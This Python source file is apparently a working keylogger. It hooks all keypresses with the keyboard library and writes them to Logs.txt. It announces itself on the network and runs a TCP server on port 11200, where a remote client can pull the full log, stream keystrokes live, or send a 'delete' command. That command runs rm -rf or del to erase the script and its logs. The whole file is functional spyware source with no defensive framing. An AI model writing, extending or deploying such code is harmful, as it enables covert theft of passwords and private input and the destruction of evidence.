import keyboard
import os
import socket
from BroadcastServer import getIP, broadcastConn
import threading, platform

class KeyLogs:
    def __init__(self) -> None:
        self.logfile = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Logs.txt")
        print(self.logfile)
        threading.Thread(target=broadcastConn, args=()).start()
        self.tcp = SendLogs(file=self.logfile)
        self.tcpThread = threading.Thread(target=self.tcp.start, args=())
        self.tcpThread.start()
        keyboard.on_press(callback=self.saveLogs)
        keyboard.wait()
    
    def saveLogs(self, event):
        key = event.name
        if key == "space":
            key = " "
        elif key == "enter":  key = "\n"
        elif len(key)>1: key = f" [{key}] "
        print(key)
        file = open(self.logfile, 'a')
        file.write(key)
        file.close()
        self.tcp.currentKey = key


class SendLogs:
    def __init__(self, file):
        self.ip = getIP()
        self.port = 11200
        self.file = file
        self.__currentKey = ""
        
    def start(self):
        while True:
            self.key_lock = threading.Lock()
            self.soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.soc.bind((self.ip, self.port))
            self.soc.listen(1)
            try:
                conn, addr = self.soc.accept()
                msg = f"Client {addr} connected!"
                print(msg)
                while True:
                    self.net_cmd(conn)
            except Exception as err:
                print(err)
            self.soc.close()
    
    def net_cmd(self, conn):
        cmd = conn.recv(1024).decode()
        if cmd == "logFile":
            conn.sendfile(open(self.file, "rb"))
            self.__currentKey = ""
        elif cmd == "liveLogs":
            self.key_lock.acquire()
            if self.__currentKey:
                conn.sendall(self.__currentKey.encode())
            else:
                conn.sendall("< >".encode())
            self.__currentKey = ""
            self.key_lock.release()
        elif cmd == "delete":
            if platform.system() == "Windows":
                os.system(f"del \"{os.path.abspath(__file__)}\"")
                os.system(f"del \"{self.file}\"")
            else:
                os.system(f"rm -rf \"{os.path.abspath(__file__)}\"")
                os.system(f"rm -rf \"{self.file}\"")
            conn.sendall("Files deleted.".encode())
        elif cmd == "delete logs":
            if platform.system() == "Windows":
                os.system(f"del \"{self.file}\"")
            else:
                os.system(f"rm -rf \"{self.file}\"")
            conn.sendall("Files deleted.".encode())
        elif cmd == "exit":
            raise Exception("Close Connection")
        else:
            conn.sendall("Invalid".encode())

    @property
    def currentKey(self):
        self.key_lock.acquire()
        x = self.__currentKey
        self.key_lock.release()
        return x

    @currentKey.setter
    def currentKey(self, k):
        self.key_lock.acquire()
        self.__currentKey = k
        self.key_lock.release()


if __name__ == "__main__":
    KeyLogs()